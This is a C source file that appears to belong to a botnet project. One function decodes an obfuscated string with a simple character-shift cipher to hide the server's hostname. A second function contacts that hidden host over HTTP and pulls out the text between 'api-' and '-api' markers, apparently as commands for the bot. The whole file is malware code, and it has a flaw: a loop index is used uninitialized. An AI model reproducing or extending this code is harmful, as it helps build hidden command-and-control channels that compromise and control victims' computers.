#include "../../includes/px_botnet.h"

char	*gSJDFGhSDfg(char *test, int pos)
{
	char	*tmp;
	int		i;
	int		a;

	tmp = malloc(sizeof(char) * strlen(test) + 1);
	i = 0;
	a = 0;
	while (test[i])
	{
		if (a == 4)
		{
			tmp[i] = test[i] - (2 + pos);
			a = 0;
		}
		else
		{
			tmp[i] = test[i] + (3 + pos);
			a++;
		}
		i++;
	}
	tmp[i] = '\0';
	return (tmp);
}

char	*ft_request(char *page)
{
	char		*convert;
	char		*content;
	char		**a;
	char		**b;
	char		*tmp;
	int			i;

	convert = gSJDFGhSDfg(stringifer, 4);
	content = NULL;
	if (!convert)
		return (NULL);
	const char	*ip = host_to_ip(convert);
	if (!ip)
	{
		free(convert);
		return (NULL);
	}

	SOCKET		sock;
	SOCKADDR_IN	sin;

	if (!http_create_socket(&sock, &sin, ip))
		return (NULL);
	content = http_request(sock, convert, page);
	closesocket(sock);
	free(convert);
	if (content == NULL)
		return (NULL);
	while (content[i])
	{
		if (content[i] && content[i + 1] && content[i + 2] && content[i + 3] && content[i] == 'a' && content[i + 1] == 'p' && content[i + 2] == 'i' && content[i + 3] == '-')
		{
			tmp = ft_strdup(content + i + 4);
			i = 0;
			free(content);
			while (tmp[i])
			{
				if (tmp[i + 1] && tmp[i + 2] && tmp[i + 3] && tmp[i] == '-' && tmp[i + 1] == 'a' && tmp[i + 2] == 'p' && tmp[i + 3] == 'i')
				{
					tmp[i] = '\0';
					return (tmp);
				}
				i++;
			}
			return (tmp);
		}
		i++;
	}
	return (NULL);
}